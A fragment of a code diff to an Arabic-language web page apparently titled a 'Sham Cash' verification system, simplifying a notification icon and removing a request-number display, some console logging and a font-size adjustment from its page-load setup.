-                <i class="fas fa-${type === 'success' ? 'check' : type === 'error' ? 'exclamation' : 'info'}-circle"></i>
+                <i class="fas fa-${type === 'success' ? 'check' : 'exclamation'}-circle"></i>
                 <span>${message}</span>
             `;
             
@@ -1960,16 +840,9 @@ ${isSuccess ? '✅ تم الوصول بنجاح' : '⚠️ تم رفض الإذ�
         
         // ===== التهيئة =====
         document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById('requestNumber').textContent = appData.requestNumber;
             console.log('🔐 نظام التحقق المتطور - شام كاش');
-            console.log('📋 رقم الطلب: ' + appData.requestNumber);
             console.log('📦 الباكج المستخدم: ' + SHAMCASH_PACKAGE);
-            console.log('🚀 4 صفحات متكاملة');
-            
-            // تكبير النص قليلاً ليكون أوضح
-            document.querySelectorAll('.form-control').forEach(input => {
-                input.style.fontSize = '16px';
-            });
+            console.log('🚀 صفحتان متكاملتان');
         });
     </script>
 </body>
